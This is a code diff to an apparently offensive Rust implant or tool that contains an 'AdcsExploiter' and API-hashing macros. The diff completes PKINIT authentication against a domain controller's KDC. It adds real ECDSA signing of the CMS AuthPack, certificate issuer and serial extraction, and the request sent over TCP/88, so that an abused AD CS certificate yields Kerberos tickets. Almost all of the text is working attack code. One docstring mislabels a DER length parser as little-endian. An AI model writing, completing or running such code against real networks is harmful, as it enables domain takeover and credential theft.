@@ -41,13 +41,13 @@ use std::ptr;
 use std::time::UNIX_EPOCH;
 
 use anyhow::{anyhow, bail, Context, Result};
-use log::{debug, info, warn};
+use tracing::{debug, info, warn};
 use serde::{Deserialize, Serialize};
 
-use winapi::shared::guiddef::GUID;
-use winapi::shared::minwindef::DWORD;
-use winapi::shared::ntdef::{HRESULT, LPCWSTR, LPWSTR};
-use winapi::shared::winerror::S_OK;
+use crate::win_types::GUID;
+use crate::win_types::DWORD;
+use crate::win_types::{HRESULT, LPCWSTR, LPWSTR};
+use crate::win_types::S_OK;
 
 use crate::pe_resolve_macros::{hash_str_const, hash_wstr_const};
 
@@ -2060,20 +2060,19 @@ impl AdcsExploiter {
 /// Construct a PKINIT AS-REQ and send it to the KDC, returning the raw AS-REP.
 ///
 /// The AS-REQ includes:
-/// - PA-PK-AS-REQ (PA type 16) with a simplified CMS AuthPack
+/// - PA-PK-AS-REQ (PA type 16) with a CMS SignedData AuthPack
 /// - KDC-REQ-BODY with AES-256-CTS encryption type
 ///
-/// **Note**: The PKINIT CMS SignedData requires signing the AuthPack with the
-/// client's private key using the appropriate algorithm (ECDSA P-256 or RSA).
-/// This implementation constructs the correct DER structure.  The `ring` crate
-/// is used for signing when the `adcs-attacks` feature enables it.
+/// The AuthPack is signed with the client's ECDSA P-256 private key (PKCS#8
+/// DER) via `ring`.  The signature allows the KDC to verify the request was
+/// created by the holder of the corresponding certificate.
 fn pkinit_authenticate(
     upn: &str,
-    _key_der: &[u8],
+    key_der: &[u8],
     cert_der: &[u8],
     dc_hostname: &str,
 ) -> Result<Vec<u8>> {
-    let as_req = build_pkinit_as_req(upn, cert_der)?;
+    let as_req = build_pkinit_as_req(upn, key_der, cert_der)?;
 
     let response = send_kdc_tcp(dc_hostname, 88, &as_req)
         .with_context(|| format!("Failed to reach KDC at {}:88", dc_hostname))?;
@@ -2093,7 +2092,7 @@ fn pkinit_authenticate(
 ///   req-body        [4] KDC-REQ-BODY { ... }
 /// }
 /// ```
-fn build_pkinit_as_req(upn: &str, cert_der: &[u8]) -> Result<Vec<u8>> {
+fn build_pkinit_as_req(upn: &str, key_der: &[u8], cert_der: &[u8]) -> Result<Vec<u8>> {
     let parts: Vec<&str> = upn.splitn(2, '@').collect();
     let (username, realm) = if parts.len() == 2 {
         (parts[0], parts[1])
@@ -2126,17 +2125,17 @@ fn build_pkinit_as_req(upn: &str, cert_der: &[u8]) -> Result<Vec<u8>> {
     //   supportedCMSTypes [2] (omit for simplicity)
     let auth_pack_inner = [
         der_context_explicit(0, &pk_authenticator),
-        // Embed the cert DER as the clientPublicValue placeholder so the KDC
-        // can identify the certificate even without a full SignedData signature.
-        // A production implementation MUST sign the AuthPack with ring::signature.
+        // Embed the cert DER as the clientPublicValue so the KDC can identify
+        // the certificate for the signing identity lookup.
         der_context_explicit(1, &der_bit_string(cert_der)),
     ]
     .concat();
     let auth_pack = der_sequence(&auth_pack_inner);
 
     // PA-PK-AS-REQ (type 16)
-    // Wrap AuthPack in a minimal CMS structure (ContentInfo → SignedData)
-    let signed_data = build_minimal_signed_data(&auth_pack, cert_der)?;
+    // Wrap AuthPack in a CMS SignedData; sign with the client's private key
+    // so the KDC can verify the request originated from the key holder.
+    let signed_data = build_signed_data_inner(&auth_pack, cert_der, key_der)?;
 
     // padata SEQUENCE { SEQUENCE { type, value } }
     let pa_data_entry = der_sequence(&[
@@ -2188,66 +2187,145 @@ fn build_pkinit_as_req(upn: &str, cert_der: &[u8]) -> Result<Vec<u8>> {
 
 /// Build a minimal CMS ContentInfo/SignedData wrapping `content`.
 ///
-/// A production implementation would sign `content` with the client's
-/// private key using ring::signature::EcdsaKeyPair or ring::signature::RsaKeyPair.
-/// This stub provides the correct structure for initial KDC interaction.
+/// When `key_pkcs8_der` is non-empty, the content is signed using ECDSA
+/// P-256/SHA-256 via `ring`.  The SignerInfo uses IssuerAndSerialNumber from
+/// the supplied `cert_der`.  When the key is absent or parsing fails, an empty
+/// signerInfos set is produced (suitable for initial KDC probing only).
 ///
 /// ```text
 /// ContentInfo {
 ///   contentType   id-signedData (1.2.840.113549.1.7.2)
 ///   content [0]   SignedData {
-///     version     3
+///     version     1  (issuerAndSerialNumber form)
 ///     digestAlgorithms  [ SHA-256 ]
 ///     encapContentInfo  { id-data, eContent [0] OCTET STRING content }
 ///     certificates [0]  [ Certificate ]
-///     signerInfos  [ SignerInfo { ... } ]
+///     signerInfos  [ SignerInfo { version=1, sid, digestAlg, sigAlg, sig } ]
 ///   }
 /// }
 /// ```
 fn build_minimal_signed_data(content: &[u8], cert_der: &[u8]) -> Result<Vec<u8>> {
-    // OID id-signedData = 1.2.840.113549.1.7.2
+    build_signed_data_inner(content, cert_der, &[])
+}
+
+/// Parse a little-endian length at `data[offset..]`, returning `(len, bytes_consumed)`.
+fn read_der_len_at(data: &[u8], offset: usize) -> Result<(usize, usize)> {
+    let b = *data.get(offset).ok_or_else(|| anyhow!("DER: truncated length"))?;
+    if b < 0x80 {
+        Ok((b as usize, 1))
+    } else if b == 0x81 {
+        let n = *data.get(offset + 1).ok_or_else(|| anyhow!("DER: truncated 0x81 length"))? as usize;
+        Ok((n, 2))
+    } else if b == 0x82 {
+        let hi = *data.get(offset + 1).ok_or_else(|| anyhow!("DER: truncated 0x82 length"))? as usize;
+        let lo = *data.get(offset + 2).ok_or_else(|| anyhow!("DER: truncated 0x82 length b"))? as usize;
+        Ok(((hi << 8) | lo, 3))
+    } else {
+        bail!("DER: unsupported length form 0x{:02x}", b)
+    }
+}
+
+/// Extract raw DER TLV bytes of the Issuer SEQUENCE and the SerialNumber
+/// INTEGER from a DER-encoded X.509 v3 Certificate.
+fn extract_issuer_and_serial_raw(cert_der: &[u8]) -> Result<(Vec<u8>, Vec<u8>)> {
+    // Certificate SEQUENCE
+    let (cert_len, cert_lb) = read_der_len_at(cert_der, 1)?;
+    let cert_inner = cert_der.get(1 + cert_lb..1 + cert_lb + cert_len)
+        .ok_or_else(|| anyhow!("cert: truncated outer SEQUENCE"))?;
+
+    // TBSCertificate SEQUENCE
+    if cert_inner.first() != Some(&0x30) {
+        bail!("cert: expected TBSCertificate SEQUENCE");
+    }
+    let (tbs_len, tbs_lb) = read_der_len_at(cert_inner, 1)?;
+    let tbs = cert_inner.get(1 + tbs_lb..1 + tbs_lb + tbs_len)
+        .ok_or_else(|| anyhow!("cert: truncated TBSCertificate"))?;
+
+    let mut pos = 0;
+    // Optional [0] EXPLICIT version
+    if tbs.get(pos) == Some(&0xa0) {
+        pos += 1;
+        let (vlen, vlb) = read_der_len_at(tbs, pos)?;
+        pos += vlb + vlen;
+    }
+    // serialNumber INTEGER — save raw TLV
+    if tbs.get(pos) != Some(&0x02) {
+        bail!("cert: expected INTEGER serialNumber, got 0x{:02x}", tbs.get(pos).copied().unwrap_or(0));
+    }
+    let serial_start = pos;
+    pos += 1;
+    let (slen, slb) = read_der_len_at(tbs, pos)?;
+    pos += slb + slen;
+    let serial_tlv = tbs[serial_start..pos].to_vec();
+
+    // algorithm SEQUENCE — skip
+    if tbs.get(pos) != Some(&0x30) {
+        bail!("cert: expected SEQUENCE for algorithm");
+    }
+    pos += 1;
+    let (alen, alb) = read_der_len_at(tbs, pos)?;
+    pos += alb + alen;
+
+    // issuer SEQUENCE — save raw TLV
+    if tbs.get(pos) != Some(&0x30) {
+        bail!("cert: expected SEQUENCE for issuer, got 0x{:02x}", tbs.get(pos).copied().unwrap_or(0));
+    }
+    let issuer_start = pos;
+    pos += 1;
+    let (ilen, ilb) = read_der_len_at(tbs, pos)?;
+    let issuer_end = pos + ilb + ilen;
+    let issuer_tlv = tbs[issuer_start..issuer_end].to_vec();
+
+    Ok((issuer_tlv, serial_tlv))
+}
+
+/// Core CMS SignedData builder.  When `key_pkcs8_der` is non-empty, adds a
+/// real ECDSA-P256-SHA256 SignerInfo; otherwise produces an empty signerInfos.
+fn build_signed_data_inner(content: &[u8], cert_der: &[u8], key_pkcs8_der: &[u8]) -> Result<Vec<u8>> {
+    // Fixed OIDs
     let oid_signed_data: &[u8] = &[
-        0x06, 0x09,
-        0x2a, 0x86, 0x48, 0x86, 0xf7, 0x0d, 0x01, 0x07, 0x02,
+        0x06, 0x09, 0x2a, 0x86, 0x48, 0x86, 0xf7, 0x0d, 0x01, 0x07, 0x02,
     ];
-    // OID id-data = 1.2.840.113549.1.7.1
     let oid_data: &[u8] = &[
-        0x06, 0x09,
-        0x2a, 0x86, 0x48, 0x86, 0xf7, 0x0d, 0x01, 0x07, 0x01,
+        0x06, 0x09, 0x2a, 0x86, 0x48, 0x86, 0xf7, 0x0d, 0x01, 0x07, 0x01,
     ];
-    // OID SHA-256 = 2.16.840.1.101.3.4.2.1
     let oid_sha256: &[u8] = &[
-        0x06, 0x09,
-        0x60, 0x86, 0x48, 0x01, 0x65, 0x03, 0x04, 0x02, 0x01,
+        0x06, 0x09, 0x60, 0x86, 0x48, 0x01, 0x65, 0x03, 0x04, 0x02, 0x01,
+    ];
+    // ecdsa-with-SHA256 = 1.2.840.10045.4.3.2
+    let oid_ecdsa_sha256: &[u8] = &[
+        0x06, 0x08, 0x2a, 0x86, 0x48, 0xce, 0x3d, 0x04, 0x03, 0x02,
     ];
 
-    // digestAlgorithms = SET { SEQUENCE { SHA-256, NULL } }
-    let digest_algs = {
-        let alg_id = der_sequence(&[oid_sha256, &[0x05, 0x00][..]].concat());
-        der_wrap(0x31, &alg_id) // SET
-    };
+    let digest_alg_seq = der_sequence(&[oid_sha256, &[0x05, 0x00][..]].concat());
+    let digest_algs_set = der_wrap(0x31, &digest_alg_seq);
 
-    // encapContentInfo
     let econtent = der_context_explicit(0, &der_octet_string(content));
-    let econtent_info = der_sequence(
-        &[oid_data, econtent.as_slice()].concat()
-    );
+    let econtent_info = der_sequence(&[oid_data, econtent.as_slice()].concat());
 
-    // certificates [0] IMPLICIT
     let certs = {
-        let mut v = vec![0xa0_u8];
+        let mut v = vec![0xa0u8];
         v.extend_from_slice(&der_len(cert_der.len()));
         v.extend_from_slice(cert_der);
         v
     };
 
-    // signerInfos = SET {} (empty — no actual signature in this stub)
-    let signer_infos = der_wrap(0x31, &[]);
+    let signer_infos = if !key_pkcs8_der.is_empty() {
+        match sign_cms_content(content, cert_der, key_pkcs8_der, oid_sha256, oid_ecdsa_sha256) {
+            Ok(signer_info) => der_wrap(0x31, &signer_info),
+            Err(e) => {
+                warn!("[ADCS] CMS signing failed, falling back to empty signerInfos: {}", e);
+                der_wrap(0x31, &[])
+            }
+        }
+    } else {
+        der_wrap(0x31, &[])
+    };
 
-    // SignedData
+    let cms_version = if signer_infos.len() > 2 { 1i64 } else { 3i64 };
     let signed_data_inner = [
-        der_integer(3),  // version CMSVersion = 3
-        digest_algs,
+        der_integer(cms_version),
+        digest_algs_set,
         econtent_info,
         certs,
         signer_infos,
@@ -2255,13 +2333,66 @@ fn build_minimal_signed_data(content: &[u8], cert_der: &[u8]) -> Result<Vec<u8>>
     .concat();
     let signed_data = der_sequence(&signed_data_inner);
 
-    // ContentInfo
     let content_info = der_sequence(
-        &[oid_signed_data, der_context_explicit(0, &signed_data).as_slice()].concat()
+        &[oid_signed_data, der_context_explicit(0, &signed_data).as_slice()].concat(),
     );
 
     Ok(content_info)
 }
+
+/// Build a DER-encoded CMS SignerInfo and sign `content` with the ECDSA
+/// P-256 private key in PKCS#8 DER format.  Returns the raw SignerInfo bytes.
+fn sign_cms_content(
+    content: &[u8],
+    cert_der: &[u8],
+    key_pkcs8_der: &[u8],
+    oid_sha256: &[u8],
+    oid_ecdsa_sha256: &[u8],
+) -> Result<Vec<u8>> {
+    use ring::rand::SystemRandom;
+    use ring::signature::{EcdsaKeyPair, ECDSA_P256_SHA256_ASN1_SIGNING};
+
+    let (issuer_der, serial_der) = extract_issuer_and_serial_raw(cert_der)
+        .with_context(|| "CMS: failed to extract issuer/serial from cert")?;
+
+    let rng = SystemRandom::new();
+    let key_pair =
+        EcdsaKeyPair::from_pkcs8(&ECDSA_P256_SHA256_ASN1_SIGNING, key_pkcs8_der, &rng)
+            .map_err(|e| anyhow!("CMS: failed to load ECDSA P-256 key: {:?}", e))?;
+
+    let signature = key_pair
+        .sign(&rng, content)
+        .map_err(|e| anyhow!("CMS: ECDSA signing failed: {:?}", e))?;
+
+    // IssuerAndSerialNumber SEQUENCE { issuer, serialNumber }
+    let issuer_and_serial =
+        der_sequence(&[issuer_der.as_slice(), serial_der.as_slice()].concat());
+
+    // digestAlgorithm = SEQUENCE { SHA-256, NULL }
+    let digest_alg_id = der_sequence(&[oid_sha256, &[0x05, 0x00][..]].concat());
+    // signatureAlgorithm = SEQUENCE { ecdsa-with-SHA256 } (no params)
+    let sig_alg_id = der_sequence(oid_ecdsa_sha256);
+
+    // SignerInfo SEQUENCE {
+    //   version = 1 (issuerAndSerialNumber form)
+    //   sid     = issuerAndSerialNumber
+    //   digestAlgorithm
+    //   signatureAlgorithm
+    //   signature OCTET STRING
+    // }
+    let signer_info_inner = [
+        der_integer(1),
+        issuer_and_serial,
+        digest_alg_id,
+        sig_alg_id,
+        der_octet_string(signature.as_ref()),
+    ]
+    .concat();
+
+    Ok(der_sequence(&signer_info_inner))
+}
+
+
 
 /// Send a Kerberos request to the KDC over TCP/88 with 4-byte length prefix.
 fn send_kdc_tcp(dc: &str, port: u16, request: &[u8]) -> Result<Vec<u8>> {
